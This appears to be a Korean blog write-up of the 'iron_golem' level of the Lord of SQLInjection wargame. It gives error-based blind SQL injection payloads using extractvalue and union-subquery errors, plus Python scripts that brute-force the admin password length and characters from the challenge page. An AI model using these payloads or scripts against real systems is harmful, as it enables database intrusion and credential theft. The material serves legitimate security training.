---
layout: single
title: "[Lord of SQLInjection] iron_golem write-up"
date: 2025-05-01 14:30 +0900
categories: 
    - WEB-write-up
tag:
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: 목차
author_profile: true
comment: true
sidebar:
    nav: "docs"
---

## Lord of SQLInjection (iron_golem)

### 풀이

이번 문제에서 pw 파라미터에 대해 필터링 되는 문자는 `prob _ . () sleep benchmark` 와 같다. 지난 문제들과 다른 점은 exit 함수로 sql 에러 페이지를 보여주고, result[id] 결과 값을 echo로 출력해주지 않는다.

![image-20250428233154058](/images/2025-04-28-los-iron-golem/image-20250428233154058.png)

<br>

mysql 에서는 서칭을 해보니 SQL 에러가 나왔을 때, `extractvalue`  함수를 사용해서 두 번째 인자에 XPATH 표현식이 아니면 이를 쿼리를 실행해서 출력해주는 것 같다. 두 번째 인수 부분에 항상 유효하지 않은 표현식이 되도록 concat 함수와 0x3a를 이용할 수 있다. 아래와 같이 페이로드를 삽입하면 extractvalue의 두 번째 인자인 'hi'가 XPATH syntax error로 출력됐다.

```
' or extractvalue('1', concat(0x3a, 'hi'))-- -
%27%20or%20extractvalue(%271%27,%20concat(0x3a,%27hi%27))--%20-
```

![image-20250428235557577](/images/2025-04-28-los-iron-golem/image-20250428235557577.png)

<br>

hi 말고 다른 값도 출력되는지 테스트 해보려고 select (5*5)를 넣어서 요청해보니 25가 잘 출력되는 것을 확인할 수 있다. 근데 이 방법을 사용하면 테이블 이름을 사용해서 select를 하면 위에 있는 키워드 필터링 문자 때문에 이 방법으로 시도하는 건 아닌 것 같다.. 

```
' or extractvalue('1', concat(0x3a, (select (5*5))))-- -
```

![image-20250501143140271](/images/2025-04-28-los-iron-golem/image-20250501143140271.png)

<br>
다른 방법으로 오류를 낼 수 있는 방법으로 찾아야 하는데, 숫자 범위를 초과해서 넣거나, if 조건문을 이용해 (select 1 union select 2)으로 한 개의 데이터만 나와야 하는데 두 개의 데이터를 집어넣는 방식으로 오류를 낼 수 있다. 아래의 페이로드를 사용해서 pw의 길이를 구할 수 있는데, 거짓일 때는 응답값에 1 row 문자열을 찾아서 나오지 않을 때까지 파이썬 코드로 작성하면 된다.

```
' or id='admin' and if(length(pw)=1,1,(select 1 union select 2))-- -
```

![image-20250501151547197](/images/2025-04-28-los-iron-golem/image-20250501151547197.png)

<br>

아래처럼 코드를 짜서 보내보면 패스워드 길이는 32인 것을 알 수 있다.

```python
import requests

url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"
cookie = {"PHPSESSID": "r5plqc9119sdnc1s4nqo9e6rrl"}
password = ""

for i in range(0, 100):
    param = {
        "pw": f"' or id='admin' and if(length(pw)={i},1,(select 1 union select 2))-- -"
    }
    r = requests.get(url=url, cookies=cookie, params=param)
    if "1 row" in r.text:
        print("pass")
        continue
    else:
        print(f"found! 패스워드 길이: {i}")
        break

```

![image-20250501151954838](/images/2025-04-28-los-iron-golem/image-20250501151954838.png)

<br>

아래와 같이 쿠키 값을 넣어줘야 los 로그인 페이지로 리다이렉트가 되지 않고, 정상 응답 값에 strong 태그가 포함되어 있으므로 이를 기반으로 코드를 짜주면 admin 패스워드를 뽑아낼 수 있다. 

```python
import requests
import string

password_charset = string.ascii_letters + string.punctuation + string.digits

url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"
cookie = {"PHPSESSID": "r5plqc9119sdnc1s4nqo9e6rrl"}
password = ""

for i in range(1, 33):
    for j in range(0, len(password_charset)):
        param = {
            "pw": f"' or id='admin' and if(substr(pw,{i},1)='{password_charset[j]}',1,(select 1 union select 2))-- -"
        }
        r = requests.get(url=url, cookies=cookie, params=param)
        if "<strong>" in r.text:
            found = True
            password += password_charset[j]
            print(f"패스워드 {i}번째 문자는 {password_charset[j]}입니다.")
            break
print(password)
```

<br>

![image-20250501161127327](/images/2025-04-28-los-iron-golem/image-20250501161127327.png)